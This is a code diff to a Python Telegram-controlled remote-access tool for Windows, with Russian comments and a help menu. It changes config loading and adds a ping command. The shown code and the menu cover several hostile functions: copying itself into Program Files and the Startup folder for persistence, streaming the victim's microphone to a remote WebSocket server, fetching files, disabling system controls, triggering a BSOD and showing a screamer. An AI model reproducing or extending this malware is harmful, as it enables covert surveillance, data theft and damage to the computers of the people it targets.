@@ -1,4 +1,4 @@
-#СУКА ЭТО НЕ ИИ, ИИ МНЕ ПИСАЛ КОММЕНТАРИИ И ПЕРЕПИСАЛ НЕКОТОРЫЕ ФУНКЦИИ КОТОРЫЕ РАБОТАЛИ БЕЗ НЕГО, ПОЛНОСТЮ ИИ ТОЛЬКО ФУНКЦИИ WEBSOCKET, GETFILE, AUTORUN, ЧАСТЬ SYSTEM INFO
+#СУКА ЭТО НЕ ИИ, ИИ МНЕ ПИСАЛ КОММЕНТАРИИ И ПЕРЕПИСАЛ НЕКОТОРЫЕ ФУНКЦИИ КОТОРЫЕ РАБОТАЛИ БЕЗ НЕГО, ПОЛНОСТЮ ИИ ТОЛЬКО ФУНКЦИИ WEBSOCKET И GETFILE
 import telebot
 import os
 from telebot import types
@@ -23,15 +23,20 @@ from ctypes import *
 import ctypes
 import time
 import websocket
+from websocket import create_connection
 from audioplayer import AudioPlayer
+import configparser
 
-bot = telebot.TeleBot('YOUR API KEY HERE')
+config = configparser.ConfigParser()
+config.read('config.ini')
+API_KEY = config.get('Telegram', 'api_key')
+WEBSOCKET_SERVER_URI = config.get('Websocket', 'server_url')# Адрес WebSocket сервера
+bot = telebot.TeleBot(API_KEY)
 
 # --- Переменные для аудиопотока ---
 ws_stream_thread = None # Поток для отправки аудио
 ws_connection = None # Объект WebSocket соединения
-is_streaming = False # Флаг, идет ли стриминг
-WEBSOCKET_SERVER_URI = "WSS server here" # Адрес WebSocket сервера
+is_streaming = False # Флаг, идет ли стриминг 
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -45,7 +50,7 @@ def start(message):
     '\n /disableControlPanel - отключить панель управления \n /enableControlPanel - включить панель управления ' \
     '\n /NoRun - отключить меню выполнить \n /enableRun - включить меню выполнить \n /NoDrives - отключить отображение дисков ' \
     '\n /enableDrives - включить отображение дисков \n /screamer - скример \n /bsod - вызывает BSOD \n /start_stream - начать аудиопоток ' \
-    '\n /stop_stream - остановить аудиопоток')
+    '\n /stop_stream - остановить аудиопоток \n /ping - пинг бота')
     # Копирование файлов в программы в папку WindowsRA(я ее сам придумал), настройка UAC и автозагрузки
     cwd = os.getcwd()
     if not os.path.exists('C:\\Program Files\\WindowsRA'):
@@ -198,8 +203,9 @@ def autorun(message):
         username = getpass.getuser()
         startup_dir = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
         shortcut_path = os.path.join(startup_dir, f"{os.path.splitext(exe_filename)[0]}.lnk")
-        
+
         bot.send_message(message.chat.id, f'Копирование файлов в {target_install_dir}...')
+
         # 2. Копируем все файлы из папки с .exe в целевую папку
         shutil.copytree(source_dir, target_install_dir, dirs_exist_ok=True)
         bot.send_message(message.chat.id, 'Файлы скопированы.')
@@ -212,8 +218,9 @@ def autorun(message):
         shortcut.TargetPath = target_exe_path
         shortcut.WorkingDirectory = target_install_dir
         shortcut.Save()
+
         bot.send_message(message.chat.id, 'Бот успешно добавлен в автозагрузку.')
-        
+
     except ImportError:
         print("Ошибка autorun: Необходима библиотека pywin32 (pip install pywin32)")
         bot.send_message(message.chat.id, 'Ошибка: Для создания ярлыка автозагрузки необходима библиотека pywin32.')
@@ -259,7 +266,7 @@ def audio_stream_worker(message):
 
         # --- Подключение к WebSocket серверу ---
         try:
-            ws = websocket.create_connection(
+            ws = create_connection(
                 WEBSOCKET_SERVER_URI, 
                 timeout=10,
                 # Включаем поддержку пингов (хотя клиент и так должен отвечать)
@@ -267,14 +274,11 @@ def audio_stream_worker(message):
             )
             bot.send_message(message.chat.id, f"Подключено к WebSocket серверу: {WEBSOCKET_SERVER_URI}")
             ws_connection = ws
-        except websocket.WebSocketBadStatusException as e:
-             bot.send_message(message.chat.id, f"Ошибка подключения (Handshake): {e.status_code} {e.reason}")
-             is_streaming = False 
-             return
         except Exception as ws_e:
             bot.send_message(message.chat.id, f"Ошибка подключения к WebSocket: {ws_e}")
             is_streaming = False 
             return 
+
         # --- Инициализация аудио ---
         audio = pyaudio.PyAudio()
         stream = audio.open(format=FORMAT, channels=CHANNELS,
@@ -759,12 +763,17 @@ def bsod(message):
 @bot.message_handler(commands=['screamer'])
 def screamer(message):
     # Вызывает скример.
-    # _internal для скомпилированной версии, можете использовать любой путь
     player = AudioPlayer(f'{cwd}\\_internal\\screamer.mp3')
     cwd = os.getcwd()
     ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{cwd}\\_internal\\screamer.png', 0)
     player.play(block=True)
     bot.send_message(message.chat.id, 'Скример страшный очень отвечаю')
+
+
+@bot.message_handler(commands=['ping'])
+def ping(message):
+    # Пинг бота.
+    bot.send_message(message.chat.id, 'работает')
 
 
 @bot.message_handler(commands=['getfile'])
